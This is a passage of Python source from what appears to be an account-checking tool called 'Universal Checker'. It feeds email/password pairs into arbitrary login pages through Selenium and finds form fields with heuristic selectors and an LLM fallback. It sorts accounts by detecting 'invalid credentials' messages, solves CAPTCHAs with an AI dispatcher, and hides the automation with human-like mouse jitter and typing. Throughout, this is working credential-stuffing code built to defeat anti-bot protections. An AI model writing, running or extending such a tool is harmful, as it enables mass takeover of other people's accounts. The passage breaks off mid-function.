            response = requests.post(url, json=payload, headers=headers, timeout=30)
            if response.status_code == 200:
                res_data = response.json()
                content = res_data["choices"][0]["message"]["content"]
                if "```json" in content:
                    content = content.split("```json")[1].split("```")[0].strip()
                elif "```" in content:
                    content = content.split("```")[1].split("```")[0].strip()
                return json.loads(content.strip())
        except Exception as e:
            print_action(f"{Fore.YELLOW}[AI Fallback] Claude proxy query failed, trying OpenRouter: {e}{Style.RESET_ALL}")
            
    # 2. Get OpenRouter API Keys
    api_keys = []
    try:
        from engine.registry.settings_manager import SettingsManager
        sm = SettingsManager()
        raw = sm.get('openrouter_api_key', '')
        if raw:
            api_keys = [raw.strip()]
    except Exception:
        pass
    if not api_keys:
        or_key = var_openrouter_keys.get().strip() if var_openrouter_keys else ''
        api_keys = [or_key] if or_key else [os.getenv('OPENROUTER_API_KEY', '')]
        
    preferred_model = var_openrouter_model.get().strip() if var_openrouter_model else "google/gemini-2.0-flash-lite-preview-02-05:free"
    
    errors = []
    for api_key in api_keys:
        if not api_key:
            continue
        try:
            url = "https://openrouter.ai/api/v1/chat/completions"
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://github.com/usemanusai/UC",
                "X-Title": "Universal Checker"
            }
            payload = {
                "model": preferred_model or "anthropic/claude-3.5-sonnet",
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.1,
                "response_format": {"type": "json_object"}
            }
            response = requests.post(url, json=payload, headers=headers, timeout=30)
            if response.status_code == 200:
                res_data = response.json()
                content = res_data["choices"][0]["message"]["content"]
                if "```json" in content:
                    content = content.split("```json")[1].split("```")[0].strip()
                elif "```" in content:
                    content = content.split("```")[1].split("```")[0].strip()
                return json.loads(content.strip())
            else:
                errors.append(f"OpenRouter API {response.status_code}: {response.text}")
        except Exception as e:
            errors.append(str(e))
            
    raise RuntimeError(f"AI matching failed. Errors: {'; '.join(errors)}")


def _save_discovered_selector_to_gui(field_type, discovered_css):
    """
    Thread-safely updates the GUI entry widget for the given field_type with discovered_css,
    saves the settings, and triggers a visual refresh.
    """
    if not discovered_css:
        return
        
    _MAP = {
        "email": entry_css_selector_email,
        "password": entry_css_selector_password,
        "next": entry_css_selector_next_button,
        "submit": entry_css_selector_submit,
        "invalid_error_selector": entry_invalid_error_selector,
        "invalid_inner_html": entry_invalid_inner_html,
        "invalid_outer_html": entry_invalid_outer_html,
        "captcha_error_selector": entry_captcha_error_selector,
        "captcha_inner_html": entry_captcha_inner_html,
        "captcha_outer_html": entry_captcha_outer_html,
    }
    
    widget = _MAP.get(field_type)
    if widget:
        def update():
            try:
                widget.delete(0, tk.END)
                widget.insert(0, discovered_css)
                widget.config(foreground=colors["fg"])
                save_settings()
                print_action(f"{Fore.GREEN}[AI Fallback] Successfully updated GUI selector for '{field_type}' -> '{discovered_css}' and saved settings.{Style.RESET_ALL}")
            except Exception as e:
                print_action(f"{Fore.RED}[AI Fallback] Error updating GUI selector: {e}{Style.RESET_ALL}")
                
        window.after(0, update)


# ──────────────────────────────────────────────────────────────────────────────
#  FAST HEURISTIC FALLBACK LAYER  (Tier 2 — between GUI selector and AI agent)
# ──────────────────────────────────────────────────────────────────────────────

# Exhaustive CSS selector lists covering virtually ALL login page patterns
# across all major websites, CMS platforms, and authentication providers.

def _fast_heuristic_find_element(browser, field_type):
    """
    FAST Selenium-native heuristic fallback (Tier 2).

    Tries an exhaustive list of common CSS selectors for the given field_type
    (email, password, submit, next) across ALL frames/iframes.

    Returns the found WebElement, or None if nothing matched.
    Auto-saves the discovered selector to GUI/settings immediately.

    Typical execution time: <2 seconds (vs 30-60s for AI agent fallback).
    """
    selectors = _HEURISTIC_SELECTORS.get(field_type, [])
    if not selectors:
        return None

    print_action(f"{Fore.CYAN}[Heuristic] Trying {len(selectors)} common selectors for '{field_type}'...{Style.RESET_ALL}")

    for selector in selectors:
        try:
            # Reset to top-level document before each search attempt
            try:
                browser.switch_to.default_content()
            except Exception:
                pass

            el = _find_element_in_frames(browser, By.CSS_SELECTOR, selector)
            if el:
                # Validate: for input fields, check if the element is visible and interactable
                try:
                    if not el.is_displayed():
                        continue
                    if field_type in ("email", "password") and not el.is_enabled():
                        continue
                    # For password fields specifically, verify it's actually a password type
                    if field_type == "password":
                        el_type = (el.get_attribute("type") or "").lower()
                        if el_type != "password":
                            continue
                except Exception:
                    pass  # If we can't check, still try using it

                print_action(f"{Fore.GREEN}[Heuristic] ✓ Found '{field_type}' using selector: {selector}{Style.RESET_ALL}")

                # Map field_type to the GUI field names
                gui_field_map = {
                    "email": "email",
                    "password": "password",
                    "submit": "submit",
                    "next": "next",
                }
                gui_key = gui_field_map.get(field_type)
                if gui_key:
                    _save_discovered_selector_to_gui(gui_key, selector)
                    # Also update in-memory capture_settings immediately
                    try:
                        capture_settings = {}  # Will be passed from caller
                    except Exception:
                        pass

                return el
        except Exception:
            continue

    # Reset to default content if we exhausted all selectors
    try:
        browser.switch_to.default_content()
    except Exception:
        pass

    print_action(f"{Fore.YELLOW}[Heuristic] ✗ No common selector matched for '{field_type}'. Will try AI fallback...{Style.RESET_ALL}")
    return None


def _fast_heuristic_detect_error(browser, error_type, invalid_account_settings=None, captcha_wrong_settings=None):
    """
    FAST Selenium-native heuristic error detection (Tier 2).

    Scans the page for error messages related to invalid credentials or CAPTCHA failures
    using common CSS selectors and multi-language text patterns.

    If found, auto-populates the GUI settings for error detection.
    Returns True if an error was detected, False otherwise.

    Typical execution time: <2 seconds.
    """
    css_selectors = _ERROR_CSS_SELECTORS.get(error_type, [])
    text_patterns = _ERROR_TEXT_PATTERNS.get(error_type, [])

    if not css_selectors and not text_patterns:
        return False

    print_action(f"{Fore.CYAN}[Heuristic] Scanning for '{error_type}' errors ({len(css_selectors)} selectors, {len(text_patterns)} text patterns)...{Style.RESET_ALL}")

    # Strategy 1: Try CSS selectors to find error containers
    for selector in css_selectors:
        try:
            try:
                browser.switch_to.default_content()
            except Exception:
                pass

            el = _find_element_in_frames(browser, By.CSS_SELECTOR, selector)
            if el and el.is_displayed():
                error_text = ""
                try:
                    error_text = (el.text or el.get_attribute("innerText") or "").strip()
                except Exception:
                    pass

                if not error_text:
                    continue  # Empty error container, skip

                # Check if the visible error text matches any known error pattern
                error_text_lower = error_text.lower()
                for pattern in text_patterns:
                    if pattern.lower() in error_text_lower:
                        outer_html = ""
                        try:
                            outer_html = el.get_attribute("outerHTML") or ""
                            if len(outer_html) > 500:
                                outer_html = outer_html[:500] + "..."
                        except Exception:
                            pass

                        print_action(
                            f"{Fore.GREEN}[Heuristic] ✓ Detected '{error_type}' error!"
                            f"\n  Selector: {selector}"
                            f"\n  Text: {error_text[:200]}"
                            f"{Style.RESET_ALL}"
                        )

                        # Auto-save to GUI depending on error type
                        if error_type == "invalid_credentials":
                            _save_discovered_selector_to_gui("invalid_error_selector", selector)
                            _save_discovered_selector_to_gui("invalid_inner_html", error_text[:300])
                            if outer_html:
                                _save_discovered_selector_to_gui("invalid_outer_html", outer_html[:500])
                            # Enable the checkbox
                            try:
                                global var_invalid_account_enabled
                                window.after(0, lambda: var_invalid_account_enabled.set(True))
                                if invalid_account_settings is not None:
                                    invalid_account_settings["enable"] = True
                                    invalid_account_settings["error_alert_css_selector"] = selector
                                    invalid_account_settings["inner_html"] = error_text[:300]
                                    invalid_account_settings["outer_html"] = outer_html[:500] if outer_html else ""
                            except Exception:
                                pass
                        elif error_type == "captcha_error":
                            _save_discovered_selector_to_gui("captcha_error_selector", selector)
                            _save_discovered_selector_to_gui("captcha_inner_html", error_text[:300])
                            if outer_html:
                                _save_discovered_selector_to_gui("captcha_outer_html", outer_html[:500])
                            try:
                                global var_captcha_wrong_enabled
                                window.after(0, lambda: var_captcha_wrong_enabled.set(True))
                                if captcha_wrong_settings is not None:
                                    captcha_wrong_settings["enable"] = True
                                    captcha_wrong_settings["error_alert_css_selector"] = selector
                                    captcha_wrong_settings["inner_html"] = error_text[:300]
                                    captcha_wrong_settings["outer_html"] = outer_html[:500] if outer_html else ""
                            except Exception:
                                pass

                        return True
        except Exception:
            continue

    # Strategy 2: Full page text search for error patterns (even without matching CSS selector)
    try:
        browser.switch_to.default_content()
    except Exception:
        pass

    try:
        page_source = browser.page_source or ""
        page_source_lower = page_source.lower()
        for pattern in text_patterns:
            if pattern.lower() in page_source_lower:
                # Found error text in page — try to locate the containing element
                print_action(
                    f"{Fore.GREEN}[Heuristic] ✓ Detected '{error_type}' via page text match: '{pattern}'{Style.RESET_ALL}"
                )

                # Try to find the element containing this text via JS
                try:
                    escaped_pattern = pattern.replace("'", "\\'").replace("\\", "\\\\")
                    found_el = browser.execute_script(f"""
                        var walker = document.createTreeWalker(
                            document.body, NodeFilter.SHOW_TEXT, null
                        );
                        while (walker.nextNode()) {{
                            var node = walker.currentNode;
                            if (node.textContent && node.textContent.toLowerCase().indexOf('{escaped_pattern.lower()}') !== -1) {{
                                var parent = node.parentElement;
                                if (parent && parent.offsetParent !== null) {{
                                    return parent;
                                }}
                            }}
                        }}
                        return null;
                    """)
                    if found_el:
                        error_text = (found_el.text or "").strip()
                        outer_html = ""
                        tag = (found_el.tag_name or "").lower()
                        classes = (found_el.get_attribute("class") or "").strip()
                        el_id = (found_el.get_attribute("id") or "").strip()

                        # Build a usable CSS selector from the found element
                        if el_id:
                            auto_sel = f"{tag}#{el_id}"
                        elif classes:
                            first_class = classes.split()[0]
                            auto_sel = f"{tag}.{first_class}"
                        else:
                            auto_sel = tag

                        try:
                            outer_html = found_el.get_attribute("outerHTML") or ""
                            if len(outer_html) > 500:
                                outer_html = outer_html[:500] + "..."
                        except Exception:
                            pass

                        if error_type == "invalid_credentials":
                            _save_discovered_selector_to_gui("invalid_error_selector", auto_sel)
                            _save_discovered_selector_to_gui("invalid_inner_html", error_text[:300] if error_text else pattern)
                            if outer_html:
                                _save_discovered_selector_to_gui("invalid_outer_html", outer_html[:500])
                            try:
                                window.after(0, lambda: var_invalid_account_enabled.set(True))
                                if invalid_account_settings is not None:
                                    invalid_account_settings["enable"] = True
                                    invalid_account_settings["error_alert_css_selector"] = auto_sel
                                    invalid_account_settings["inner_html"] = error_text[:300] if error_text else pattern
                                    invalid_account_settings["outer_html"] = outer_html[:500] if outer_html else ""
                            except Exception:
                                pass
                        elif error_type == "captcha_error":
                            _save_discovered_selector_to_gui("captcha_error_selector", auto_sel)
                            _save_discovered_selector_to_gui("captcha_inner_html", error_text[:300] if error_text else pattern)
                            if outer_html:
                                _save_discovered_selector_to_gui("captcha_outer_html", outer_html[:500])
                            try:
                                window.after(0, lambda: var_captcha_wrong_enabled.set(True))
                                if captcha_wrong_settings is not None:
                                    captcha_wrong_settings["enable"] = True
                                    captcha_wrong_settings["error_alert_css_selector"] = auto_sel
                                    captcha_wrong_settings["inner_html"] = error_text[:300] if error_text else pattern
                                    captcha_wrong_settings["outer_html"] = outer_html[:500] if outer_html else ""
                            except Exception:
                                pass

                        return True
                except Exception:
                    pass

                return True  # Text matched in page source even if we couldn't get the element
    except Exception:
        pass

    print_action(f"{Fore.YELLOW}[Heuristic] ✗ No '{error_type}' error detected on current page.{Style.RESET_ALL}")
    return False


def _ai_self_discover_and_interact(browser, field_type, value=None):
    """
    CDP-Connected AI Self-Discovery Fallback.
    Connects to the live Selenium Chrome session, fetches frame-aware accessibility tree,
    queries the AI to discover the element ref and selector, executes the action (fill/click),
    and updates GUI selectors.
    """
    print_action(f"{Fore.CYAN}[AI Fallback] Initiating self-discovery for field '{field_type}'...{Style.RESET_ALL}")
    
    # 1. Get CDP Port
    port = _get_cdp_debug_port(browser)
    if not port:
        print_action(f"{Fore.RED}[AI Fallback] Error: Could not retrieve CDP debugging port for active browser.{Style.RESET_ALL}")
        return False
        
    try:
        # 2. Take Snapshot & Evaluate DOM
        js_query = "eval (function(){var els=[];var tags=['input','button','select','textarea','form'];for(var i=0;i<tags.length;i++){var nl=document.getElementsByTagName(tags[i]);for(var j=0;j<nl.length;j++){els.push(nl[j]);}}var potential_errors=document.querySelectorAll('div,span,p,label,section,h1,h2,h3');var error_keywords=[/error/i,/danger/i,/warning/i,/alert/i,/incorrect/i,/fail/i,/invalid/i,/wrong/i,/неверный/i,/ошибка/i,/неправильн/i,/captcha/i,/капча/i];for(var i=0;i<potential_errors.length;i++){var el=potential_errors[i];var text=el.innerText||'';var className=el.className||'';var idName=el.id||'';var matches=false;for(var k=0;k<error_keywords.length;k++){if(error_keywords[k].test(text)||error_keywords[k].test(className)||error_keywords[k].test(idName)){matches=true;break;}}if(matches&&els.indexOf(el)===-1){els.push(el);}}return els.map(function(el){var outer=el.outerHTML||'';if(outer.length>300){outer=outer.slice(0,300)+'...';}return {tag:el.tagName,id:el.id,class:el.className,name:el.name||'-',placeholder:el.placeholder||'-',type:el.type||'-',text:(el.innerText||el.value||'').trim(),outerHTML:outer};}).slice(0,150);})()"
        
        global_opts = ["--cdp", str(port)]
        cmd_list = ["snapshot", js_query]
        batch_args = list(global_opts)
        batch_args.extend(["--json", "batch"])
        batch_args.extend(cmd_list)
        
        stdout, stderr, code = _run_agent_browser(batch_args)
        if code != 0:
            print_action(f"{Fore.RED}[AI Fallback] Failed to execute agent-browser batch: {stderr or stdout}{Style.RESET_ALL}")
            return False
            
        snapshot_text = ""
        dom_elements = []
        try:
            parsed_batch = json.loads(stdout.strip())
            if isinstance(parsed_batch, list):
                for res_block in parsed_batch:
                    if not res_block.get("success"):
                        continue
                    cmd_info = res_block.get("command", [])
                    result_data = res_block.get("result")
                    if not isinstance(result_data, dict):
                        continue
                    if cmd_info and cmd_info[0] == "snapshot":
                        snapshot_text = result_data.get("snapshot", "")
                    elif cmd_info and cmd_info[0] == "eval":
                        nested_res = result_data.get("result")
                        if isinstance(nested_res, list):
                            dom_elements = nested_res
        except Exception as e:
            print_action(f"{Fore.YELLOW}[AI Fallback] Warning parsing batch result: {e}{Style.RESET_ALL}")
            
        if not snapshot_text:
            print_action(f"{Fore.RED}[AI Fallback] Accessibility snapshot empty. Cannot proceed.{Style.RESET_ALL}")
            return False
            
        # 3. Construct prompt
        target_desc = f"handle the '{field_type}' step"
        if value:
            target_desc += f" by typing/filling: '{value}'"
            
        prompt = f"""
You are an AI selector and form discovery agent connecting to a live browser session.
We need to: {target_desc}

Here is the interactive Accessibility Tree of the CURRENT page state:
```text
{snapshot_text}
```

Here is the detailed DOM elements metadata from querySelectorAll:
```json
{json.dumps(dom_elements, indent=2)}
```

Analyze the elements and identify:
1. Mapped fields and selectors (in CSS selector format) if you can identify them in this step.
2. The next action to take to advance the login form (such as filling email, clicking next, filling password, clicking submit, or waiting for Captcha solver).
3. If any incorrect credentials (username/password) or incorrect CAPTCHA error alerts are visible on the page, detect their CSS selectors, inner text, and outer HTML.

Response MUST be a JSON object matching this exact format:
{{
  "email_ref": "@eX",          // The ref code from the accessibility tree for email input (or null if already filled / not found)
  "email_selector": "input...", // The CSS selector for email input (or null)
  "password_ref": "@eY",       // The ref code for password input (or null if not found)
  "password_selector": "input...", // The CSS selector for password input (or null)
  "submit_ref": "@eZ",         // The ref for final submit button (or null)
  "submit_selector": "button...", // The CSS selector for submit button (or null)
  "next_ref": "@eW",           // The ref for intermediate 'Next' button if multi-step login (or null)
  "next_selector": "button...",   // The CSS selector for intermediate 'Next' button (or null)
  
  "invalid_error_selector": "...",       // CSS selector of incorrect username/password error alert (or null if not visible)
  "invalid_inner_html": "...",           // The exact inner text (Inner HTML) of incorrect username/password error alert (or null)
  "invalid_outer_html": "...",           // The exact outer HTML of the incorrect username/password error alert (or null)
  
  "captcha_error_selector": "...",       // CSS selector of CAPTCHA incorrect error alert (or null if not visible)
  "captcha_inner_html": "...",           // The exact inner text (Inner HTML) of CAPTCHA incorrect error (or null)
  "captcha_outer_html": "...",           // The exact outer HTML of the CAPTCHA incorrect error (or null)

  "action_type": "fill_email" | "fill_password" | "click_next" | "submit" | "wait" | "none", // What is the action to execute
  "target_ref": "@eN",         // The element ref code to apply the action on (or null if none)
  "target_selector": "input...", // The CSS selector for the element to apply the action on (e.g. "#login" or "button.btn-primary" or null)
  "error_selector": "div...",  // If you detect any active warning or error message container on this page, specify its CSS selector (or null)
  "error_message": "..."       // If an error is visible, specify the text (or null)
}}
"""
        
        # 4. Query LLM
        ai_res = _global_ask_ai_agent(prompt)
        print_action(f"{Fore.GREEN}[AI Fallback] AI Decision: {ai_res.get('action_type')} on target {ai_res.get('target_selector') or ai_res.get('target_ref')}{Style.RESET_ALL}")
        
        # 5. Extract and save newly discovered selectors
        _selector_mappings = {
            "email": ("email_selector", "email"),
            "password": ("password_selector", "password"),
            "next": ("next_selector", "next"),
            "submit": ("submit_selector", "submit"),
            "invalid_error_selector": ("invalid_error_selector", "invalid_error_selector"),
            "invalid_inner_html": ("invalid_inner_html", "invalid_inner_html"),
            "invalid_outer_html": ("invalid_outer_html", "invalid_outer_html"),
            "captcha_error_selector": ("captcha_error_selector", "captcha_error_selector"),
            "captcha_inner_html": ("captcha_inner_html", "captcha_inner_html"),
            "captcha_outer_html": ("captcha_outer_html", "captcha_outer_html")
        }
        
        # Snapshot current GUI state variables or local dictionaries
        global var_invalid_account_enabled, var_captcha_wrong_enabled
        for type_key, (ai_key, gui_key) in _selector_mappings.items():
            discovered_val = ai_res.get(ai_key)
            if discovered_val:
                _save_discovered_selector_to_gui(gui_key, discovered_val)
                # Update in-memory capture settings so the current loop uses them immediately!
                if "css_selectors" in capture_settings:
                    if type_key in {"email", "password", "next", "submit"}:
                        capture_settings["css_selectors"][type_key] = discovered_val
                    elif type_key in {"invalid_error_selector", "invalid_inner_html", "invalid_outer_html"}:
                        # Enable error checks if we discovered a selector
                        window.after(0, lambda: var_invalid_account_enabled.set(True))
                        invalid_account_settings["enable"] = True
                        if type_key == "invalid_error_selector":
                            invalid_account_settings["error_alert_css_selector"] = discovered_val
                        else:
                            clean_key = type_key.replace("invalid_", "")
                            invalid_account_settings[clean_key] = discovered_val
                    elif type_key in {"captcha_error_selector", "captcha_inner_html", "captcha_outer_html"}:
                        window.after(0, lambda: var_captcha_wrong_enabled.set(True))
                        captcha_wrong_settings["enable"] = True
                        if type_key == "captcha_error_selector":
                            captcha_wrong_settings["error_alert_css_selector"] = discovered_val
                        else:
                            clean_key = type_key.replace("captcha_", "")
                            captcha_wrong_settings[clean_key] = discovered_val
                            
        # 6. Interact on-the-fly!
        action_type = ai_res.get("action_type")
        target_ref = ai_res.get("target_ref")
        target_selector = ai_res.get("target_selector")
        
        # Prioritize accessibility ref code to traverse frames/cross-origins
        interact_target = target_ref if (target_ref and target_ref.startswith("@")) else target_selector
        if not interact_target:
            interact_target = target_selector or target_ref
            
        if interact_target:
            print_action(f"[AI Fallback] Executing action '{action_type}' on '{interact_target}'...")
            
            if action_type == "fill_email" and value:
                if interact_target.startswith("@"):
                    _run_agent_browser(global_opts + ["fill", interact_target, value])
                else:
                    _run_agent_browser(global_opts + ["find", "first", interact_target, "fill", value])
                return True
                
            elif action_type == "fill_password" and value:
                if interact_target.startswith("@"):
                    _run_agent_browser(global_opts + ["fill", interact_target, value])
                else:
                    _run_agent_browser(global_opts + ["find", "first", interact_target, "fill", value])
                return True
                
            elif action_type in ["click_next", "click_submit", "submit"] or (action_type == "click_button" and field_type in ["next", "submit"]):
                if interact_target.startswith("@"):
                    _run_agent_browser(global_opts + ["click", interact_target])
                else:
                    _run_agent_browser(global_opts + ["find", "first", interact_target, "click"])
                return True
                
        return False
        
    except Exception as e:
        print_action(f"{Fore.RED}[AI Fallback] Error in self-discovery fallback: {e}{Style.RESET_ALL}")
        return False


def check_account(


    account,
    browser,
    website_link,
    valid_link,
    db_name,
    custom_valid_link,
    results_folder,
    capture_settings,
    sleep_durations,
    invalid_account_settings,
    captcha_wrong_settings,
    stealth_settings=None,
):
    """Checks a single account."""
    email, password = account
    try:
        # Loop through the fields sequence dynamically!
        global fields_sequence
        delay = 15 / (float(capture_settings.get("speed_percentage", 500)) + 1)
        
        for field in fields_sequence:
            field_id = field["id"]
            field_type = field["type"]
            
            if field_type == "workflow_rule":
                # Only execute sequentially if no specific custom event trigger is enabled, or if it is configured for sequential trigger
                timing = field.get("timing", {})
                has_any_trigger = any(t.get("enabled", False) for t in timing.values())
                if not has_any_trigger:
                    execute_rule_actions(field, browser, email, password, capture_settings)
                continue
            
            if field_id == "website_target_link":
                # BEFORE_OPEN_URL lifecycle hook
                trigger_lifecycle_hook("before_open_url", {
                    "browser": browser,
                    "email": email,
                    "password": password,
                    "capture_settings": capture_settings
                })
                
                print_action(f"Opening website: {website_link}")
                if not _ensure_browser_session(browser, website_link):
                    print_action(f"{Fore.RED}[Account] Aborting check for {email}: browser session could not be established.{Style.RESET_ALL}")
                    return
                _prune_extra_tabs(browser, website_link)
                
                # PAGE_DOM_READY lifecycle hook
                trigger_lifecycle_hook("page_dom_ready", {
                    "browser": browser,
                    "email": email,
                    "password": password,
                    "capture_settings": capture_settings
                })
                
                if var_enable_mouse_clicks.get() and mouse_clicks:
                    import pyautogui
                    from engine.kernel.math_engine.tda import verify_l2c2_continuity, zss_tree_edit_distance
                    
                    last_click_coords = None
                    last_click_dom = None
                    
                    for click_action in mouse_clicks:
                        x, y, num_clicks, interval = click_action
                        x, y = int(x), int(y)
                        print_action(f"{Fore.MAGENTA}Performing {num_clicks} mouse clicks at ({x}, {y}) with {interval} seconds interval.{Style.RESET_ALL}")
                        
                        # Verify coordinate alignment continuity using L2C2 constraint
                        try:
                            body_html = browser.find_element(By.TAG_NAME, "body").get_attribute("outerHTML")
                            current_dom = html_to_dom_node(body_html)
                        except Exception:
                            current_dom = None
                            
                        if last_click_coords and last_click_dom and current_dom:
                            dx = x - last_click_coords[0]
                            dy = y - last_click_coords[1]
                            d_dom = zss_tree_edit_distance(current_dom, last_click_dom)
                            d_dom = max(d_dom, 0.1) # Avoid zero division
                            if not verify_l2c2_continuity((dx, dy), d_dom, lipschitz_const=50.0):
                                print_action(f"{Fore.RED}[L2C2] Continuity violation detected! Spatial change ({dx}, {dy}) exceeds bound for DOM diff ({d_dom}). Potential Coordinate Hijacking!{Style.RESET_ALL}")
                                
                        last_click_coords = (x, y)
                        last_click_dom = current_dom
                        
                        if stealth_settings and stealth_settings.get("jitter") and 'HumanJitter' in globals():
                            for _ in range(int(num_clicks)):
                                try:
                                    curr_x, curr_y = pyautogui.position()
                                    HumanJitter.move_mouse_stealth(x, y)
                                    pyautogui.click()
                                except Exception:
                                    pyautogui.click(x=x, y=y)
                                time.sleep(float(interval))
                        else:
                            for _ in range(int(num_clicks)):
                                pyautogui.click(x=x, y=y)
                                time.sleep(float(interval))

                if var_enable_mouse_clicks.get() and css_clicks:
                    for click_action in css_clicks:
                        css_selector, num_clicks, interval = click_action
                        print_action(f"{Fore.MAGENTA}Performing {num_clicks} clicks on element with selector '{css_selector}' with {interval} seconds interval.{Style.RESET_ALL}")
                        element = _safe_find_element(browser, By.CSS_SELECTOR, css_selector, timeout=10, description=f"css-click target '{css_selector}'")
                        if element is None:
                            print_action(f"{Fore.YELLOW}[CSS-Click] Skipping '{css_selector}' - element not found or session dropped.{Style.RESET_ALL}")
                            continue
                        for _ in range(int(num_clicks)):
                            try:
                                browser.execute_script("arguments[0].click();", element)
                            except WebDriverException as _wde:
                                print_action(f"{Fore.YELLOW}[CSS-Click] execute_script click failed: {str(_wde)[:120]}. Continuing.{Style.RESET_ALL}")
                                break
                            time.sleep(float(interval))
                
                delay = 15 / (float(capture_settings.get("speed_percentage", 500)) + 1)
                countdown_sleep(delay)
                
            elif field_id == "sleep_email":
                dur = float(sleep_durations.get("sleep_email", 25))
                print_action(f"Sleeping for {dur} seconds before Email field...")
                time.sleep(dur)
                
            elif field_id == "css_selector_email":
                # before_field_interaction lifecycle hook
                trigger_lifecycle_hook("before_field_interaction", {
                    "browser": browser,
                    "email": email,
                    "password": password,
                    "capture_settings": capture_settings
                })
                
                print_action("Locating email/username field...")
                email_sel = capture_settings["css_selectors"]["email"]
                email_field = _safe_find_element(browser, By.CSS_SELECTOR, email_sel, timeout=5, description="email/username field") if email_sel else None
                # ── Tier 2: Fast heuristic fallback (<2s) ──
                if email_field is None:
                    print_action(f"{Fore.CYAN}[Account] Standard email locator failed. Trying fast heuristic...{Style.RESET_ALL}")
                    email_field = _fast_heuristic_find_element(browser, "email")
                # ── Tier 3: AI agent fallback (30-60s) ──
                if email_field is None:
                    print_action(f"{Fore.YELLOW}[Account] Heuristic also failed. Triggering AI self-discovery fallback...{Style.RESET_ALL}")
                    success = _ai_self_discover_and_interact(browser, "email", email)
                    if not success:
                        print_action(f"{Fore.RED}[Account] AI self-discovery failed to fill email field. Aborting.{Style.RESET_ALL}")
                        return
                else:
                    try:
                        email_field.clear()
                    except Exception as e:
                        import logging
                        logging.debug(f"Failed to clear email field: {e}")
                    if stealth_settings and stealth_settings.get("jitter") and 'HumanJitter' in globals():
                        HumanJitter.human_typing(email, email_field)
                    else:
                        email_field.send_keys(email)
                    
            elif field_id == "css_selector_next_button":
                next_sel = capture_settings["css_selectors"].get("next")
                print_action("Locating and clicking Next button...")
                next_button = _safe_find_element(browser, By.CSS_SELECTOR, next_sel, timeout=5, description="next button") if next_sel else None
                # ── Tier 2: Fast heuristic fallback (<2s) ──
                if next_button is None:
                    print_action(f"{Fore.CYAN}[Account] Standard Next locator failed. Trying fast heuristic...{Style.RESET_ALL}")
                    next_button = _fast_heuristic_find_element(browser, "next")
                if next_button is not None:
                    try:
                        next_button.click()
                        countdown_sleep(delay)
                    except TimeoutException:
                        print_action(f"{Fore.YELLOW}Next button not found within the given time. Skipping.{Style.RESET_ALL}")
                    except NoSuchElementException:
                        pass
                    except ElementClickInterceptedException:
                        browser.execute_script("arguments[0].click();", next_button)
                    except Exception as e:
                        print_action(f"{Fore.YELLOW}Next button click failed: {e}. Trying AI fallback...{Style.RESET_ALL}")
                        _ai_self_discover_and_interact(browser, "next")
                else:
                    # ── Tier 3: AI agent fallback ──
                    print_action(f"{Fore.YELLOW}[Account] Heuristic also failed for Next. Triggering AI fallback...{Style.RESET_ALL}")
                    _ai_self_discover_and_interact(browser, "next")
                        
            elif field_id == "sleep_password":
                dur = float(sleep_durations.get("sleep_password", 25))
                print_action(f"Sleeping for {dur} seconds before Password field...")
                time.sleep(dur)
                
            elif field_id == "css_selector_password":
                # before_field_interaction lifecycle hook
                trigger_lifecycle_hook("before_field_interaction", {
                    "browser": browser,
                    "email": email,
                    "password": password,
                    "capture_settings": capture_settings
                })
                
                keys = stealth_settings.get("openrouter_keys") if stealth_settings else []
                if keys and var_captcha_wrong_enabled.get():
                    captcha_attempts = 0
                    previous_attempts = []
                    dispatcher = _get_captcha_dispatcher(api_keys=keys)
                    if dispatcher:
                        while True:
                            captcha_attempts += 1
                            try:
                                captcha_img_sel = capture_settings["css_selectors"].get("captcha_image")
                                captcha_in_sel = capture_settings["css_selectors"].get("captcha_input")
                                if not captcha_img_sel or not captcha_in_sel:
                                    break
                                try:
                                    captcha_element = WebDriverWait(browser, 5).until(
                                        EC.presence_of_element_located((By.CSS_SELECTOR, captcha_img_sel))
                                    )
                                    # before_captcha lifecycle hook
                                    trigger_lifecycle_hook("before_captcha", {
                                        "browser": browser,
                                        "email": email,
                                        "password": password,
                                        "capture_settings": capture_settings
                                    })
                                    
                                    print_action(f"{Fore.CYAN}CAPTCHA detected! Starting unified AI dispatcher (Attempt {captcha_attempts})...{Style.RESET_ALL}")
                                    captcha_bytes = captcha_element.screenshot_as_png
                                    solution = dispatcher.solve_image(
                                        image_bytes=captcha_bytes,
                                        captcha_type=TYPE_AUTO,
                                        previous_attempts=previous_attempts
                                    )
                                    if solution:
                                        print_action(f"{Fore.GREEN}AI CAPTCHA solved: {solution}{Style.RESET_ALL}")
                                        input_field = _safe_find_element(browser, By.CSS_SELECTOR, captcha_in_sel, timeout=10, description="captcha input field")
                                        if input_field is None:
                                            print_action(f"{Fore.YELLOW}CAPTCHA input field disappeared. Retrying...{Style.RESET_ALL}")
                                            continue
                                        try:
                                            input_field.clear()
                                            input_field.send_keys(solution)
                                            
                                            # after_captcha lifecycle hook
                                            trigger_lifecycle_hook("after_captcha", {
                                                "browser": browser,
                                                "email": email,
                                                "password": password,
                                                "capture_settings": capture_settings
                                            })
                                        except WebDriverException as _we:
                                            print_action(f"{Fore.YELLOW}Failed to type CAPTCHA: {str(_we)[:100]}. Retrying...{Style.RESET_ALL}")
                                            continue
                                        
                                        cap_sub_sel = capture_settings["css_selectors"].get("captcha_submit")
                                        if cap_sub_sel:
                                            cap_btn = _safe_find_element(browser, By.CSS_SELECTOR, cap_sub_sel, timeout=5)
                                            if cap_btn:
                                                try:
                                                    cap_btn.click()
                                                except Exception:
                                                    browser.execute_script("arguments[0].click();", cap_btn)
                                        time.sleep(5)
                                        try:
                                            browser.find_element(By.CSS_SELECTOR, captcha_img_sel)
                                            print_action(f"{Fore.YELLOW}CAPTCHA still present. Retrying...{Style.RESET_ALL}")
                                            previous_attempts.append(solution)
                                            continue
                                        except NoSuchElementException:
                                            print_action(f"{Fore.GREEN}CAPTCHA solved successfully (element gone).{Style.RESET_ALL}")
                                            break
                                        except WebDriverException:
                                            break
                                    else:
                                        print_action(f"{Fore.YELLOW}AI Solver failed to solve. Retrying...{Style.RESET_ALL}")
                                        time.sleep(2)
                                        continue
                                except TimeoutException:
                                    break
                            except Exception as e:
                                print_action(f"{Fore.RED}CAPTCHA Exception: {e}. Retrying...{Style.RESET_ALL}")
                                time.sleep(2)
 
                print_action("Locating password field...")
                pwd_sel = capture_settings["css_selectors"]["password"]
                password_field = _safe_find_element(browser, By.CSS_SELECTOR, pwd_sel, timeout=5, description="password field") if pwd_sel else None
                # ── Tier 2: Fast heuristic fallback (<2s) ──
                if password_field is None:
